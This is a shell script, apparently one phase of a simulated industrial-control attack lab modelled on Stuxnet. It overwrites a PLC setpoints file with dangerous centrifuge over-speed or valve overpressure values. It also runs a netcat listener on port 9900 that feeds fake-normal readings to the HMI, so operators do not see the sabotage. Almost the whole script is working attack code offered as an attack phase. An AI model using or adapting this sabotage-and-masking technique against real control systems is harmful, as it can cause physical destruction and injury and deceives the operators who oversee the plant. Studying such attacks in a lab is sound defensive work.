#!/bin/sh
# Phase 5: PLC Manipulation — setpoint injection + HMI spoofing
# Overwrites /plc/setpoints.conf with dangerous values (the daemon loop re-reads
# this file every 3s, so /plc/status.log immediately starts reflecting the attack).
# Starts a spoofing listener on port 9900 that returns fake-normal values to the
# HMI daemon — mirroring Stuxnet's actual HMI-masking behaviour.

echo "=== Phase 5: PLC Manipulation ==="
echo "Target: $TARGET_ID ($TARGET_IP)"
echo "Time:   $(date -u +%Y-%m-%dT%H:%M:%S)"

case "$TARGET_ID" in
  plc-1)
    echo "Compromising Centrifuge PLC (UF-320) — over-speed attack..."

    # Inject dangerous setpoints: RPM driven to structural failure limit
    cat > /plc/setpoints.conf << 'EOF'
DEVICE=Centrifuge_PLC_UF-320
CENTRIFUGE_RPM_SETPOINT=1410
CENTRIFUGE_RPM_MAX=1410
PRESSURE_LIMIT_PSI=130
VIBRATION_LIMIT=0.95
OPERATING_MODE=COMPROMISED
EOF

    echo ""
    echo "Setpoints INJECTED (centrifuge over-speed attack):"
    cat /plc/setpoints.conf
    echo ""
    echo "Daemon will log RPM=1410 (over rated max) within 3 seconds."

    # Stop any existing spoof listener
    pkill -f "nc -l.*9900\|nc -l -p 9900" 2>/dev/null || true
    sleep 1

    # HMI spoofing listener: serves fake-normal RPM to any connecting HMI client
    (
      while true; do
        printf 'CENTRIFUGE_RPM=1064 PRESSURE=97psi VIBRATION=0.12g STATUS=normal\n' | nc -l -p 9900 2>/dev/null
      done
    ) &

    SPOOF_PID=$!
    echo $SPOOF_PID > /plc/spoof.pid
    echo "HMI spoofing listener started on :9900 (PID $SPOOF_PID)"
    echo ""
    echo "TRUTH  (status.log):  RPM=1410 PRESSURE=130psi VIBRATION=0.95g  [DANGEROUS]"
    echo "LIE    (port 9900):   RPM=1064 PRESSURE=97psi  VIBRATION=0.12g  [fake normal]"
    ;;

  plc-2)
    echo "Compromising Valve PLC (VF-210) — overpressure attack..."

    # Inject dangerous valve positions: fully open + 6x feed rate
    cat > /plc/setpoints.conf << 'EOF'
DEVICE=Valve_PLC_VF-210
VALVE_A_POSITION=97
VALVE_B_POSITION=98
FEED_RATE_KG_H=8.9
OPERATING_MODE=COMPROMISED
EOF

    echo ""
    echo "Setpoints INJECTED (valve overpressure attack):"
    cat /plc/setpoints.conf
    echo ""
    echo "Daemon will log VALVE_A=97% VALVE_B=98% FEED_RATE=8.9kg/h within 3 seconds."

    pkill -f "nc -l.*9900\|nc -l -p 9900" 2>/dev/null || true
    sleep 1

    (
      while true; do
        printf 'VALVE_A=42%% VALVE_B=68%% FEED_RATE=1.4kg/h STATUS=normal\n' | nc -l -p 9900 2>/dev/null
      done
    ) &

    SPOOF_PID=$!
    echo $SPOOF_PID > /plc/spoof.pid
    echo "HMI spoofing listener started on :9900 (PID $SPOOF_PID)"
    echo ""
    echo "TRUTH  (status.log):  VALVE_A=97% VALVE_B=98% FEED_RATE=8.9kg/h  [DANGEROUS]"
    echo "LIE    (port 9900):   VALVE_A=42% VALVE_B=68% FEED_RATE=1.4kg/h  [fake normal]"
    ;;

  *)
    echo "ERROR: unrecognised TARGET_ID '$TARGET_ID' (expected plc-1 or plc-2)" >&2
    exit 1
    ;;
esac

echo ""
echo "Phase 5 complete."
echo "Monitor truth:    tail -f /plc/status.log"
echo "Check masking:    nc $TARGET_IP 9900   (returns fake-normal values)"
echo "HMI display:      tail -f /hmi/display.log on hmi-1 (should still show normal)"
